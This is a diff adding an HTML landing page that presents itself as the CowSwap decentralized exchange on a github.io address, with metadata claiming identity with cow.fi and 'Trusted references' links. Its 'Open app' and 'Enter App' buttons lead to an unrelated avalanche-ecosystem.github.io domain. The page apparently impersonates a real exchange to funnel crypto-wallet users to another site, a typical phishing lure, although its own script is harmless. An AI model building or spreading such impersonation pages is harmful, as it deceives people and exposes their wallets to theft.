@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CowSwap</title>
+  <meta name="description" content="CowSwap is a decentralized exchange that settles swaps with MEV protection from your own wallet.">
+  <link rel="canonical" href="https://cowswap-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F8FA">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="CowSwap">
+  <meta property="og:description" content="CowSwap is a decentralized exchange that settles swaps with MEV protection from your own wallet.">
+  <meta property="og:url" content="https://cowswap-app.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CowSwap">
+  <meta name="twitter:description" content="CowSwap is a decentralized exchange that settles swaps with MEV protection from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://cowswap-app.github.io/#website",
+        "url": "https://cowswap-app.github.io/",
+        "name": "CowSwap",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://cowswap-app.github.io/#app",
+        "name": "CowSwap",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://cowswap-app.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://cowswap-app.github.io/#organization",
+        "name": "CowSwap",
+        "url": "https://cowswap-app.github.io/",
+        "sameAs": ["https://cow.fi/"]
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="CowSwap">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>CowSwap</span>
+    </div>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/token/0xdef1ca1fb7fbcdc777520aa7f396b4e015f497ab" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://www.coingecko.com/en/coins/cow-protocol" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">Ethereum DeFi</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="CowSwap">
+      <h1>CowSwap</h1>
+      <p class="sub"><strong>CowSwap</strong> is a decentralized exchange that settles swaps with MEV protection from your own wallet.</p>
+    </section>
+
+    <section class="swap-card" aria-label="Swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="asset">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="asset">
+            <img src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">CowSwap &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function(){
+      var assets = document.querySelectorAll(".asset");
+      if (assets.length < 2) return;
+      var first = assets[0].innerHTML;
+      assets[0].innerHTML = assets[1].innerHTML;
+      assets[1].innerHTML = first;
+      button.classList.toggle("turned");
+    });
+  })();
+  </script>
+</body>
+</html>
